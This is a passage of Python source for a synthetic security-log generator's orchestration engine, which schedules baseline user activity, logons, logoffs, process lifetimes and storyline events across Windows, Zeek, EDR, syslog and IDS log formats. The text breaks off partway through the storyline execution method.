"""Generation engine for coordinated log production.

This module provides the main orchestrator for Phase 1 log generation.
It coordinates StateManager, emitters, and activity generation to produce
consistent synthetic security logs across multiple formats.
"""

import base64
import logging
import math
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Callable, Optional

from evidenceforge.formats import load_format
from evidenceforge.generation.activity import ActivityGenerator
from evidenceforge.generation.emitters import (
    WindowsEventEmitter,
    ZeekEmitter,
    ZeekDnsEmitter,
    ZeekHttpEmitter,
    ZeekSslEmitter,
    ZeekFilesEmitter,
    ZeekDhcpEmitter,
    ZeekNtpEmitter,
    ZeekWeirdEmitter,
    ZeekX509Emitter,
    ZeekOcspEmitter,
    ZeekPeEmitter,
    ZeekPacketFilterEmitter,
    ZeekReporterEmitter,
    EcarEmitter,
    SyslogEmitter,
    BashHistoryEmitter,
    SnortEmitter,
    SysmonEventEmitter,
    WebEmitter,
)
from evidenceforge.events.base import RawLogEntry
from evidenceforge.events.dispatcher import EventDispatcher
from evidenceforge.generation.ground_truth import GroundTruthGenerator
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.scenario import Persona, Scenario, User, System
from evidenceforge.utils.time import parse_duration, parse_iso8601, resolve_time_window
from evidenceforge.validation.schema import BUILTIN_ACCOUNTS

logger = logging.getLogger(__name__)


class GenerationEngine:
    """Single-threaded log generation orchestrator for Phase 1.

    Coordinates StateManager, emitters, and activity generation to produce
    temporally consistent logs across multiple formats (Windows Event Logs,
    Zeek conn.log) with proper cross-references (LogonIDs, PIDs, timestamps).

    Phase 1 Constraints:
    - Single-threaded execution
    - Small datasets (<10K events)
    - Fixed baseline patterns (no LLM expansion)
    - Simple storyline keyword matching
    - Hour-by-hour time iteration

    Attributes:
        scenario: Validated Scenario object with environment, baseline, storyline
        output_dir: Directory for generated logs and documentation
        state_manager: StateManager instance for cross-log consistency
        emitters: Dict mapping format name to emitter instance
        start_time: Scenario start datetime (UTC)
        end_time: Scenario end datetime (UTC)
        malicious_events: List of malicious events for GROUND_TRUTH.md
    """

    def __init__(
        self,
        scenario: Scenario,
        output_dir: Path,
        progress_callback: Optional[Callable[[str, dict], None]] = None,
        ground_truth_dir: Optional[Path] = None,
    ):
        """Initialize generation engine.

        Args:
            scenario: Validated scenario object
            output_dir: Output directory path for generated log files
            progress_callback: Optional callback for progress reporting.
                Called with (event_type: str, data: dict) at key milestones.
            ground_truth_dir: Directory for GROUND_TRUTH.md. Defaults to output_dir.
        """
        self.scenario = scenario
        self.output_dir = output_dir
        self.ground_truth_dir = ground_truth_dir or output_dir
        self.progress_callback = progress_callback
        self.state_manager = StateManager()
        self.emitters: dict[str, WindowsEventEmitter | ZeekEmitter | EcarEmitter | SyslogEmitter | BashHistoryEmitter | SnortEmitter | WebEmitter] = {}
        self.activity_generator: Optional[ActivityGenerator] = None
        self.start_time: Optional[datetime] = None
        self.end_time: Optional[datetime] = None
        self.malicious_events: list[dict] = []  # Track for GROUND_TRUTH.md

        # Event counter for record IDs
        self.event_record_counter = 10000

    def _report_progress(self, event_type: str, data: dict) -> None:
        """Report progress to callback if registered.

        Args:
            event_type: Type of progress event (e.g., "phase_start", "hour_progress")
            data: Event-specific data payload
        """
        if self.progress_callback:
            self.progress_callback(event_type, data)

    def generate(self) -> None:
        """Main generation flow.

        Orchestrates the complete log generation process:
        1. Initialize state manager and emitters
        2. Generate baseline activity (hour-by-hour iteration)
        3. Execute storyline events (if present)
        4. Finalize and close emitters
        5. Generate GROUND_TRUTH.md (if malicious activity present)
        """
        logger.info(f"Starting generation for scenario: {self.scenario.name}")

        # Phase 1: Initialize
        self._report_progress("phase_start", {"phase": "initialize", "description": "Initializing generation engine"})
        self._initialize()
        self._report_progress("phase_end", {"phase": "initialize"})

        try:
            # Phase 2: Generate baseline activity
            self._report_progress("phase_start", {"phase": "baseline", "description": "Generating baseline activity"})
            self._generate_baseline()
            self._report_progress("phase_end", {"phase": "baseline"})

            # Phase 6.3: Execute remaining storyline events not covered by baseline hours
            if self.scenario.storyline:
                remaining = [i for i in range(len(self.scenario.storyline))
                             if i not in self._storyline_executed]
                if remaining:
                    logger.info(f"Executing {len(remaining)} remaining storyline events (outside baseline window)")
                    self._report_progress("phase_start", {
                        "phase": "storyline",
                        "description": f"Executing {len(remaining)} remaining storyline events"
                    })
                    for idx in remaining:
                        self._execute_single_storyline_event(idx)
                        self._storyline_executed.add(idx)
                    self._barrier_flush_all_emitters()
                    self._report_progress("phase_end", {"phase": "storyline"})
        finally:
            # Phase 4: Finalize and close emitters (always, even on error)
            self._report_progress("phase_start", {"phase": "finalize", "description": "Finalizing generation"})
            self._finalize()
            self._report_progress("phase_end", {"phase": "finalize"})

        # Phase 5: Generate ground truth (if malicious activity present)
        if self.malicious_events:
            logger.info(f"Generating GROUND_TRUTH.md with {len(self.malicious_events)} malicious events")
            self._report_progress("phase_start", {"phase": "ground_truth", "description": "Generating ground truth documentation"})
            self._generate_ground_truth()
            self._report_progress("phase_end", {"phase": "ground_truth"})

        logger.info("Generation complete")

    def _initialize(self) -> None:
        """Initialize state manager, emitters, and validate scenario.

        - Resolves time window (start/end datetimes)
        - Creates output directory
        - Loads format definitions
        - Initializes emitters for each format
        - Sets initial StateManager time
        """
        logger.info("Initializing generation engine")

        # Resolve time window
        self.start_time, self.end_time = resolve_time_window(self.scenario.time_window)
        logger.info(f"Time window: {self.start_time} to {self.end_time}")

        # Create output directory
        self.output_dir.mkdir(parents=True, exist_ok=True)
        logger.info(f"Output directory: {self.output_dir}")

        # Load format definitions and create emitters
        # Phase 2.2: Added new formats (eCAR, syslog, bash_history, snort, web)
        # Note: windows_event_security kept temporarily until Phase 2.10 when activity.py
        # is updated to emit to eCAR instead
        formats_to_generate = [
            'windows_event_security',  # Phase 1 - Temporary (activity.py still uses this)
            'zeek_conn',               # Phase 1 - Network visibility
            'zeek_dns',                # Phase 5.3 - DNS query logging
            'zeek_http',               # Zeek expansion - HTTP logging
            'zeek_ssl',                # Zeek expansion - SSL/TLS logging
            'zeek_files',              # Zeek expansion - File transfer logging
            'zeek_dhcp',               # Zeek expansion - DHCP logging
            'zeek_ntp',                # Zeek expansion - NTP logging
            'zeek_weird',              # Zeek expansion - Anomaly logging
            'zeek_x509',               # Zeek expansion - X.509 certificate logging
            'zeek_ocsp',               # Zeek expansion - OCSP response logging
            'zeek_pe',                 # Zeek expansion - PE analysis logging
            'zeek_packet_filter',      # Zeek expansion - Packet filter state
            'zeek_reporter',           # Zeek expansion - Sensor diagnostics
            'ecar',                    # Phase 2.2 - Primary host EDR/XDR
            'syslog',                  # Phase 2.2 - Linux native logs
            'bash_history',            # Phase 2.2 - Command history
            'snort_alert',             # Phase 2.2 - IDS alerts
            'web_access'               # Phase 2.2 - Web logs
        ]

        # Map format names to emitter classes
        emitter_classes = {
            'windows_event_security': WindowsEventEmitter,
            'windows_event_sysmon': SysmonEventEmitter,
            'zeek_conn': ZeekEmitter,
            'zeek_dns': ZeekDnsEmitter,
            'zeek_http': ZeekHttpEmitter,
            'zeek_ssl': ZeekSslEmitter,
            'zeek_files': ZeekFilesEmitter,
            'zeek_dhcp': ZeekDhcpEmitter,
            'zeek_ntp': ZeekNtpEmitter,
            'zeek_weird': ZeekWeirdEmitter,
            'zeek_x509': ZeekX509Emitter,
            'zeek_ocsp': ZeekOcspEmitter,
            'zeek_pe': ZeekPeEmitter,
            'zeek_packet_filter': ZeekPacketFilterEmitter,
            'zeek_reporter': ZeekReporterEmitter,
            'ecar': EcarEmitter,
            'syslog': SyslogEmitter,
            'bash_history': BashHistoryEmitter,
            'snort_alert': SnortEmitter,
            'web_access': WebEmitter,
        }

        # Build per-format sensor hostname mapping for network sensors
        _sensor_hostnames_by_format: dict[str, list[str]] = {}
        if self.scenario.environment.network and self.scenario.environment.network.sensors:
            for s in self.scenario.environment.network.sensors:
                hostname = s.hostname or s.name
                for fmt in s.log_formats:
                    _sensor_hostnames_by_format.setdefault(fmt, []).append(hostname)

        _ZEEK_FORMATS = {k for k in emitter_classes if k.startswith("zeek_")}
        # Network sensor formats get per-sensor dirs; host-based formats get per-host FQDN dirs
        _SENSOR_FORMATS = _ZEEK_FORMATS | {'snort_alert'}
        _HOST_FORMATS = {'windows_event_security', 'ecar', 'syslog', 'bash_history'}

        for format_name in formats_to_generate:
            format_def = load_format(format_name)

            if format_name in _SENSOR_FORMATS:
                # Network sensor emitters use per-sensor directory multiplexing
                sensor_hostnames = _sensor_hostnames_by_format.get(format_name, [])
                emitter_class = emitter_classes[format_name]
                emitter = emitter_class(
                    format_def, self.output_dir, threaded=True,
                    sensor_hostnames=sensor_hostnames,
                )
            elif format_name in _HOST_FORMATS:
                # Host-based emitters route to per-host FQDN directories internally
                emitter = emitter_classes[format_name](format_def, self.output_dir, threaded=True)
            else:
                output_path = self.output_dir / f"{format_name}{format_def.output.file_extension}"
                emitter = emitter_classes[format_name](format_def, output_path, threaded=True)

            self.emitters[format_name] = emitter
            logger.info(f"Initialized {format_name} emitter (threaded)")

        # Initialize network visibility engine (Phase 2.5)
        from evidenceforge.generation.network_visibility import NetworkVisibilityEngine
        visibility_engine = NetworkVisibilityEngine(
            network_config=self.scenario.environment.network,
            systems=self.scenario.environment.systems,
        )

        # Phase 5.1: Generate domain SID and per-user SID registry
        sid_registry = self._build_sid_registry()

        # Phase 5.5: Generate per-user timing and behavioral offsets
        rng = random.Random(hash(self.scenario.name + "_offsets"))
        self._user_time_offsets: dict[str, dict[str, float]] = {}
        for user in self.scenario.environment.users:
            self._user_time_offsets[user.username] = {
                'start_offset': rng.gauss(0, 0.25),        # ~±15min work start
                'end_offset': rng.gauss(0, 0.25),          # ~±15min work end
                'lunch_start_offset': rng.gauss(0, 0.17),  # ~±10min lunch start
                'lunch_duration_offset': rng.gauss(0, 0.12),  # ~±7min lunch length
                'intensity_bias': rng.uniform(0.8, 1.2),    # ±20% event intensity
                'cluster_size_bias': rng.gauss(0, 0.2),     # ±20% cluster size
                'inter_gap_bias': rng.gauss(0, 0.15),       # ±15% gap timing
            }

        # Initialize event dispatcher and activity generator
        self.dispatcher = EventDispatcher(
            state_manager=self.state_manager,
            emitters=self.emitters,
            visibility_engine=visibility_engine,
        )
        self.activity_generator = ActivityGenerator(
            state_manager=self.state_manager,
            emitters=self.emitters,
            event_record_counter=self.event_record_counter,
            network_visibility=visibility_engine,
            sid_registry=sid_registry,
            dispatcher=self.dispatcher,
        )
        logger.info("Initialized activity generator")

        # Set initial state manager time
        self.state_manager.set_current_time(self.start_time)

        # Phase 6.3: Resolve AD domain for FQDNs and domain name fields
        self._ad_domain = self._resolve_ad_domain()
        self._netbios_domain = self._ad_domain.split('.')[0].upper() if self._ad_domain else 'CORP'
        self.activity_generator._ad_domain = self._ad_domain
        self.activity_generator._netbios_domain = self._netbios_domain

        # Phase 5.4: Pre-seed system process trees and detect infrastructure IPs
        self._infra_ips = self._detect_infrastructure_ips()
        self._system_service_defaults = self._build_service_defaults()
        self._system_pids: dict[str, dict[str, int]] = {}  # hostname -> {role: pid}
        self._seed_system_process_trees()

        # Per-host kernel boot uptime: deterministic offset (seconds since boot at scenario start)
        # Each host "booted" 3-30 days before the scenario starts
        self._kernel_boot_uptimes: dict[str, float] = {}
        self._audit_serials: dict[str, int] = {}  # per-host monotonic audit serial
        for system in self.scenario.environment.systems:
            boot_days = (hash(system.hostname) % 28) + 3  # 3-30 days
            self._kernel_boot_uptimes[system.hostname] = boot_days * 86400.0
            self._audit_serials[system.hostname] = (hash(system.hostname) % 5000) + 1000

        # Phase 6.3: Pre-parse storyline event times for interleaved generation
        self._storyline_by_hour: dict[int, list] = {}  # hour_epoch -> list of (time, event_idx)
        if self.scenario.storyline:
            for idx, event in enumerate(self.scenario.storyline):
                event_time = self._parse_storyline_time(event.time)
                hour_key = int(event_time.replace(minute=0, second=0, microsecond=0).timestamp())
                self._storyline_by_hour.setdefault(hour_key, []).append((event_time, idx))
            # Sort each hour's events by time
            for key in self._storyline_by_hour:
                self._storyline_by_hour[key].sort()
            logger.info(f"Pre-parsed {len(self.scenario.storyline)} storyline events across {len(self._storyline_by_hour)} hours")

        self._storyline_executed: set[int] = set()

        logger.info("Initialization complete")

    def _generate_baseline(self) -> None:
        """Generate baseline activity for all enabled users.

        Iterates hour-by-hour through the time window, generating activity
        for each enabled user based on their persona, intensity, and variation.

        Phase 1 Implementation:
        - Simple hour-by-hour iteration
        - Fixed activity patterns (no LLM)
        - Uniform distribution with jitter within each hour
        """
        logger.info("Starting baseline activity generation")

        # Get enabled users only
        enabled_users = [u for u in self.scenario.environment.users if u.enabled]
        logger.info(f"Generating baseline for {len(enabled_users)} enabled users")

        # Calculate total hours for progress tracking
        total_hours = int((self.end_time - self.start_time).total_seconds() / 3600)

        # Hour-by-hour iteration
        current_hour = self.start_time
        hour_count = 0

        while current_hour < self.end_time:
            hour_count += 1
            logger.debug(f"Processing hour {hour_count}: {current_hour}")
            self.state_manager.set_current_time(current_hour)

            # Report hour progress
            self._report_progress("hour_progress", {
                "hour": hour_count,
                "total_hours": total_hours,
                "current_time": current_hour
            })

            # Generate events for each user this hour
            for user in enabled_users:
                # Resolve persona for work hours and risk modulation
                persona = self._get_user_persona(user)
                user_offsets = self._user_time_offsets.get(user.username)

                # Calculate events for this user this hour
                num_events = self._calculate_events_for_hour(
                    user, current_hour=current_hour.hour, persona=persona,
                    user_offsets=user_offsets,
                )

                if num_events > 0:
                    # Phase 5.8: 20% chance of idle hour per user (creates multi-hour
                    # gaps that boost inter-event CV for burstiness scoring)
                    if random.random() < 0.20:
                        continue

                    # Distribute events across the hour (clustered)
                    persona_name = user.persona if user.persona else None
                    event_times = self._distribute_events_in_hour(
                        current_hour, num_events,
                        persona_name=persona_name,
                        username=user.username,
                    )

                    # Generate user activity at each time
                    for event_time in event_times:
                        self._generate_user_activity(user, event_time)

            # Phase 5.4: Generate system traffic (DNS, NTP, scheduled tasks)
            self._generate_system_traffic(current_hour)

            # Phase 6.3: Interleave storyline events into this hour
            hour_key = int(current_hour.timestamp())
            for event_time, event_idx in self._storyline_by_hour.get(hour_key, []):
                if event_idx not in self._storyline_executed:
                    self._execute_single_storyline_event(event_idx)
                    self._storyline_executed.add(event_idx)

            # Phase 5.2: Terminate stale processes
            self._terminate_stale_processes(current_hour)

            # Phase 5.1: Generate logoffs for sessions that should end this hour
            self._generate_logoffs_for_hour(enabled_users, current_hour)

            # Barrier flush - ensure all events for this hour are written
            # before proceeding to next hour (temporal consistency)
            self._barrier_flush_all_emitters()

            # Move to next hour
            current_hour += timedelta(hours=1)

        logger.info(f"Baseline generation complete: processed {hour_count} hours")

    def _terminate_stale_processes(self, current_hour: datetime) -> None:
        """Terminate processes that have exceeded their expected lifetime.

        Called per-hour. Process lifetime depends on type:
        - System processes (svchost, lsass, csrss, services, explorer): never
        - Browsers/editors (chrome, firefox, outlook, code): 1-4 hours
        - Build tools (msbuild, gcc, npm): 5-30 minutes
        - Other: 30min-2 hours

        Args:
            current_hour: Start of the current hour
        """
        # Patterns for processes that should never be terminated
        system_patterns = ('svchost', 'lsass', 'csrss', 'services.exe', 'explorer.exe',
                           'smss', 'wininit', 'winlogon', 'fontdrvhost', 'systemd',
                           'cron', 'sshd', 'rsyslogd', 'NetworkManager', 'dbus-daemon',
                           'bash', 'agetty')

        # Patterns for short-lived processes (5-30 min)
        short_lived = ('msbuild', 'gcc', 'npm', 'make', 'dotnet', 'cargo', 'node.exe')

        for system in self.scenario.environment.systems:
            processes = self.state_manager.get_processes_on_system(system.hostname)
            for proc in list(processes):
                proc_age_hours = (current_hour - proc.start_time).total_seconds() / 3600
                image_lower = proc.image.lower()

                # System processes: never terminate
                if any(p in image_lower for p in system_patterns):
                    continue

                # Determine max lifetime
                if any(p in image_lower for p in short_lived):
                    max_hours = random.uniform(0.08, 0.5)  # 5-30 min
                elif any(p in image_lower for p in ('chrome', 'firefox', 'edge', 'outlook', 'teams', 'code')):
                    max_hours = random.uniform(1.0, 4.0)
                else:
                    max_hours = random.uniform(0.5, 2.0)

                if proc_age_hours > max_hours and random.random() < 0.5:
                    # Find user and generate termination
                    actor = self._find_actor(proc.username)
                    if not actor:
                        continue

                    # Get logon_id from active sessions
                    sessions = self.state_manager.get_sessions_for_user(proc.username)
                    logon_id = sessions[0].logon_id if sessions else '0x0'

                    term_offset = random.uniform(0, 3599)
                    term_time = current_hour + timedelta(seconds=term_offset)
                    self.state_manager.set_current_time(term_time)
                    self.activity_generator.generate_process_termination(
                        user=actor,
                        system=system,
                        time=term_time,
                        pid=proc.pid,
                        process_name=proc.image,
                        logon_id=logon_id,
                    )

    def _generate_logoffs_for_hour(
        self,
        users: list[User],
        current_hour: datetime,
    ) -> None:
        """Generate logoff events for sessions that should end this hour.

        For each user with active sessions, probabilistically end sessions:
        - 30% chance per session if session age > 1 hour
        - 60% chance if current hour is outside user's work hours

        Args:
            users: List of enabled users
            current_hour: Start of the current hour
        """
        for user in users:
            sessions = self.state_manager.get_sessions_for_user(user.username)
            if not sessions:
                continue

            persona = self._get_user_persona(user)
            is_outside_work_hours = False
            if persona and persona.work_hours_parsed:
                is_outside_work_hours = current_hour.hour not in persona.work_hours_parsed.get('hours', range(24))

            # Find the system for this user (for logoff emission)
            system = None
            if user.primary_system:
                systems = [s for s in self.scenario.environment.systems if s.hostname == user.primary_system]
                if systems:
                    system = systems[0]
            if not system:
                assigned = [s for s in self.scenario.environment.systems if s.assigned_user == user.username]
                system = assigned[0] if assigned else self.scenario.environment.systems[0]

            for session in list(sessions):  # Copy list since we modify during iteration
                session_age_hours = (current_hour - session.start_time).total_seconds() / 3600
                if session_age_hours < 0.5:
                    continue  # Too new to logoff

                logoff_probability = 0.6 if is_outside_work_hours else 0.3 if session_age_hours > 1 else 0.1
                if random.random() < logoff_probability:
                    # Generate logoff at a random time within the hour
                    logoff_offset = random.uniform(0, 3599)
                    logoff_time = current_hour + timedelta(seconds=logoff_offset)
                    self.state_manager.set_current_time(logoff_time)
                    self.activity_generator.generate_logoff(
                        user=user,
                        system=system,
                        time=logoff_time,
                        logon_id=session.logon_id,
                        logon_type=session.logon_type,
                    )

    def _barrier_flush_all_emitters(self) -> None:
        """Flush all emitters and wait for completion (hour-level barrier).

        Ensures temporal consistency: all events for hour N are written
        before hour N+1 begins.
        """
        logger.debug("Barrier flush: waiting for all emitters to complete")
        for format_name, emitter in self.emitters.items():
            emitter.barrier_flush()
        logger.debug("Barrier flush: all emitters complete")

    def _get_user_persona(self, user: User) -> Optional[Persona]:
        """Resolve user.persona string to Persona object.

        Args:
            user: User whose persona to resolve

        Returns:
            Persona object or None if not found
        """
        if not user.persona or not self.scenario.personas:
            return None
        for persona in self.scenario.personas:
            if persona.name == user.persona:
                return persona
        return None

    @staticmethod
    def _sigmoid(x: float) -> float:
        """Sigmoid function for smooth temporal transitions."""
        return 1.0 / (1.0 + math.exp(-6.0 * x))

    def _work_hour_multiplier(
        self,
        hour: int,
        whp: dict,
        user_offsets: Optional[dict] = None,
    ) -> float:
        """Calculate activity multiplier based on work hours with smooth transitions.

        Returns 0.0–1.5 multiplier. Uses sigmoid ramps for gradual transitions
        at work start/end and lunch, instead of binary on/off.

        Args:
            hour: Integer hour of day (0-23)
            whp: work_hours_parsed dict with start, end, lunch, peak_hours
            user_offsets: Optional per-user timing offsets

        Returns:
            Activity multiplier (0.02–1.5)
        """
        start = whp['start']
        end = whp['end']
        lunch = whp.get('lunch')  # (start_hour, end_hour) or None
        peak_hours = whp.get('peak_hours') or []

        # Apply per-user offsets if provided
        if user_offsets:
            start += user_offsets.get('start_offset', 0)
            end += user_offsets.get('end_offset', 0)
            if lunch:
                lunch_start = lunch[0] + user_offsets.get('lunch_start_offset', 0)
                lunch_dur_offset = user_offsets.get('lunch_duration_offset', 0)
                lunch_end = lunch[1] + user_offsets.get('lunch_start_offset', 0) + lunch_dur_offset
                lunch = (lunch_start, lunch_end)

        h = float(hour) + 0.5  # Use mid-hour for smoother curve

        # Morning ramp-up: sigmoid from start-1.5 to start
        if h < start - 1.5:
            return 0.02  # Near-zero early morning
        if h < start + 0.5:
            t = (h - (start - 1.0)) / 1.5  # 0 to 1 over transition
            return 0.02 + 0.98 * self._sigmoid(t * 2 - 1)

        # Evening ramp-down: sigmoid from end to end+1.5
        if h > end + 1.5:
            return 0.02  # Near-zero late evening
        if h > end - 0.5:
            t = (h - (end - 0.5)) / 1.5  # 0 to 1 over transition
            return 0.02 + 0.98 * (1.0 - self._sigmoid(t * 2 - 1))

        # Lunch dip (soft, 50% not 0%)
        if lunch:
            lunch_start, lunch_end = lunch
            lunch_mid = (lunch_start + lunch_end) / 2.0
            lunch_half = (lunch_end - lunch_start) / 2.0
            if lunch_start - 0.5 < h < lunch_end + 0.5:
                # Smooth dip centered on lunch mid-point
                dist_from_mid = abs(h - lunch_mid)
                if dist_from_mid < lunch_half:
                    return 0.5  # Core lunch: 50%
                else:
                    # Transition zone (0.5h on each side)
                    t = (dist_from_mid - lunch_half) / 0.5
                    return 0.5 + 0.5 * min(1.0, t)  # Ramp 0.5 → 1.0

        # Peak hours: 1.5x
        if hour in peak_hours:
            return 1.5

        # Normal work hours
        return 1.0

    def _calculate_events_for_hour(
        self,
        user: User,
        current_hour: Optional[int] = None,
        persona: Optional[Persona] = None,
        user_offsets: Optional[dict] = None,
    ) -> int:
        """Calculate number of events for user this hour.

        Applies intensity + variation + persona risk profile + sigmoid work hours
        to determine how many events to generate for this user during this hour.

        Args:
            user: User to calculate events for
            current_hour: Hour of day (0-23) for work hours modulation
            persona: Resolved Persona object for risk/work-hours modulation
            user_offsets: Optional per-user timing offsets

        Returns:
            Number of events to generate (>= 0)
        """
        # Base intensity from scenario
        intensity_map = {'low': 5, 'medium': 15, 'high': 40}
        base_events = intensity_map[self.scenario.baseline_activity.intensity]

        # Risk profile multiplier
        if persona and persona.risk_profile:
            risk_mult = {'low': 0.7, 'medium': 1.0, 'high': 1.3}
            base_events = int(base_events * risk_mult.get(persona.risk_profile, 1.0))

        # Phase 5.5: Sigmoid work hours modulation (replaces binary on/off)
        if persona and persona.work_hours_parsed and current_hour is not None:
            multiplier = self._work_hour_multiplier(
                current_hour, persona.work_hours_parsed, user_offsets
            )
            base_events = int(base_events * multiplier)

        # Phase 5.5: Per-user intensity bias (so two same-persona users differ)
        if user_offsets and 'intensity_bias' in user_offsets:
            base_events = int(base_events * user_offsets['intensity_bias'])

        # Apply variation (random jitter)
        variation_map = {'low': 0.10, 'medium': 0.25, 'high': 0.50}
        stddev = base_events * variation_map[self.scenario.baseline_activity.variation]
        num_events = max(0, int(random.gauss(base_events, stddev)))

        return num_events

    # Phase 5.5: Per-persona cluster configuration
    PERSONA_CLUSTER_CONFIG = {
        'developer': {'cluster_size': (5, 15), 'inter_gap_mean': 600},
        'executive': {'cluster_size': (2, 6), 'inter_gap_mean': 300},
        'analyst': {'cluster_size': (4, 10), 'inter_gap_mean': 480},
        'sysadmin': {'cluster_size': (3, 8), 'inter_gap_mean': 360},
        'default': {'cluster_size': (3, 10), 'inter_gap_mean': 420},
    }

    def _distribute_events_in_hour_uniform(self, hour_start: datetime, num_events: int) -> list[datetime]:
        """Distribute events uniformly (legacy fallback).

        Args:
            hour_start: Start of the hour
            num_events: Number of events to distribute

        Returns:
            List of event times sorted chronologically
        """
        if num_events == 0:
            return []

        interval = 3600 / num_events
        times = []
        for i in range(num_events):
            offset = interval * i + random.uniform(-interval * 0.25, interval * 0.25)
            offset = max(0, min(3599, offset))
            times.append(hour_start + timedelta(seconds=offset))
        return sorted(times)

    def _distribute_events_in_hour(
        self,
        hour_start: datetime,
        num_events: int,
        persona_name: Optional[str] = None,
        username: Optional[str] = None,
    ) -> list[datetime]:
        """Distribute events in activity clusters within an hour.

        Phase 5.5: Replaces uniform spacing with realistic bursty clusters.
        Events within a cluster are spaced 0.5-3 seconds apart.
        Inter-cluster gaps follow exponential distribution.

        Args:
            hour_start: Start of the hour
            num_events: Number of events to distribute
            persona_name: Optional persona for cluster config
            username: Optional username for per-user variation

        Returns:
            List of event times sorted chronologically
        """
        if num_events == 0:
            return []

        # Get persona-specific cluster config
        config = self.PERSONA_CLUSTER_CONFIG.get(
            (persona_name or '').lower(),
            self.PERSONA_CLUSTER_CONFIG['default']
        )
        cluster_min, cluster_max = config['cluster_size']
        inter_gap_mean = config['inter_gap_mean']

        # Apply per-user variation
        if username and hasattr(self, '_user_time_offsets'):
            offsets = self._user_time_offsets.get(username, {})
            size_bias = 1.0 + offsets.get('cluster_size_bias', 0)
            cluster_min = max(2, int(cluster_min * size_bias))
            cluster_max = max(cluster_min + 1, int(cluster_max * size_bias))
            gap_bias = 1.0 + offsets.get('inter_gap_bias', 0)
            inter_gap_mean = max(60, inter_gap_mean * gap_bias)

        times: list[datetime] = []
        remaining = num_events
        t = random.expovariate(1.0 / 60)  # First cluster offset (mean ~1min)

        while remaining > 0:
            # Allow singleton clusters (size 1) for more gap variance
            cluster_size = min(remaining, random.randint(max(1, cluster_min - 1), cluster_max))
            for i in range(cluster_size):
                if i > 0:
                    t += random.uniform(0.3, 2.0)  # Tight intra-cluster spacing
                # Drop events that overflow the hour boundary (no clamping to 3599)
                if t < 3600:
                    times.append(hour_start + timedelta(seconds=t))
            remaining -= cluster_size
            # Inter-cluster gap: sum of 2 exponentials (higher variance than single)
            t += random.expovariate(1.0 / inter_gap_mean) + random.expovariate(1.0 / inter_gap_mean)

        if not times:
            return []

        sorted_times = sorted(times)

        # Safety cap: max 5 activity slots per 5-second window
        # (each slot emits 3-5 log records across formats, so 5 × 4 ≈ 20 total records)
        final: list[datetime] = [sorted_times[0]]
        for ts in sorted_times[1:]:
            recent = sum(1 for prev in final[-5:] if (ts - prev).total_seconds() <= 5.0)
            if recent < 5:
                final.append(ts)
            else:
                final.append(final[-1] + timedelta(seconds=random.uniform(5.1, 8.0)))

        return sorted(final)

    def _generate_user_activity(self, user: User, event_time: datetime) -> None:
        """Generate activity for user at specified time.

        Uses ActivityGenerator to execute baseline activity patterns based on
        the user's persona (or default pattern if no persona assigned).

        Args:
            user: User to generate activity for
            event_time: Time of the activity
        """
        # Get user's system (prioritize primary_system, then assigned systems, then random)
        if user.primary_system:
            # Use user's primary system
            systems = [s for s in self.scenario.environment.systems if s.hostname == user.primary_system]
            system = systems[0] if systems else random.choice(self.scenario.environment.systems)
        else:
            # Find systems assigned to this user
            assigned_systems = [s for s in self.scenario.environment.systems if s.assigned_user == user.username]
            if assigned_systems:
                system = random.choice(assigned_systems)
            else:
                system = random.choice(self.scenario.environment.systems)

        # Get baseline pattern for user's persona
        persona = self._get_user_persona(user)
        persona_name = user.persona if user.persona else None
        pattern = self.activity_generator.get_baseline_pattern(persona_name, persona=persona)

        # Phase 6.2: Break mechanical traffic patterns
        # Use deterministic per-user-per-time RNG for reproducibility
        rng = random.Random(hash(f"{user.username}_{event_time}"))

        # Shuffle activity order to break rigid DNS→web→DNS→SMTP sequence
        pattern = list(pattern)
        rng.shuffle(pattern)

        # 15% chance of idle period (user away from desk)
        if rng.random() < 0.15:
            return

        # Build activity list with occasional bursts
        activities = []
        for activity_type, probability in pattern:
            if rng.random() < probability:
                # 20% chance of burst: repeat same activity 2-4 times
                if rng.random() < 0.20:
                    activities.extend([activity_type] * rng.randint(2, 4))
                else:
                    activities.append(activity_type)

        # Ensure user has a session before any process activity
        # If no active session, prepend a logon event before the first activity
        sessions = self.state_manager.get_sessions_for_user(user.username)
        if not sessions and activities:
            logon_time = event_time - timedelta(seconds=rng.uniform(1.0, 5.0))
            self.state_manager.set_current_time(logon_time)
            self.activity_generator.execute_baseline_activity(
                user=user, system=system, time=logon_time, activity_type='logon'
            )

        # Execute with per-activity jitter (0-55s offset within the timeslot)
        for activity_type in activities:
            jitter = timedelta(seconds=rng.randint(0, 55))
            t = event_time + jitter
            self.state_manager.set_current_time(t)
            self.activity_generator.execute_baseline_activity(
                user=user,
                system=system,
                time=t,
                activity_type=activity_type
            )

    def _execute_storyline(self) -> None:
        """Execute storyline events (malicious/suspicious activities).

        Parses storyline events, executes them at specified times, and tracks
        them for GROUND_TRUTH.md generation. Implements baseline suppression
        (±5 min window) to avoid conflicts with baseline activity.

        Phase 1 Implementation:
        - Simple keyword matching for activity types
        - Basic event generation based on activity description
        - Tracking of malicious events for ground truth
        """
        total_events = len(self.scenario.storyline)
        # Phase 6.3: Track previous event time for causal ordering with jitter
        _prev_event_time = None

        for event_num, storyline_event in enumerate(self.scenario.storyline, start=1):
            # Parse event time and add realistic jitter (±0-30s + microseconds)
            event_time = self._parse_storyline_time(storyline_event.time)
            jitter_rng = random.Random(hash(f"jitter_{event_num}_{self.scenario.name}"))
            jitter = timedelta(
                seconds=jitter_rng.uniform(-30, 30),
                microseconds=jitter_rng.randint(0, 999999),
            )
            event_time = event_time + jitter
            # Enforce causal ordering: must be after previous event
            if _prev_event_time and event_time <= _prev_event_time:
                event_time = _prev_event_time + timedelta(
                    milliseconds=jitter_rng.randint(100, 5000)
                )
            _prev_event_time = event_time

            # Find actor and system
            actor = self._find_actor(storyline_event.actor)
            system = self._find_system(storyline_event.system)

            if not actor or not system:
                logger.warning(
                    f"Skipping storyline event: actor={storyline_event.actor}, "
                    f"system={storyline_event.system} not found"
                )
                continue

            logger.info(
                f"Executing storyline event: {storyline_event.actor} on "
                f"{storyline_event.system} at {event_time}"
            )

            # Report storyline progress
            self._report_progress("storyline_progress", {
                "event_num": event_num,
                "total_events": total_events,
                "actor": actor.username,
                "system": system.hostname
            })

            # Match activity to event types (simple keyword matching)
            event_types = self._match_activity_to_events(storyline_event.activity)

            # Execute each matched event type
            self.state_manager.set_current_time(event_time)

            for event_type in event_types:
                malicious_event = self._execute_storyline_event(
                    actor=actor,
                    system=system,
                    time=event_time,
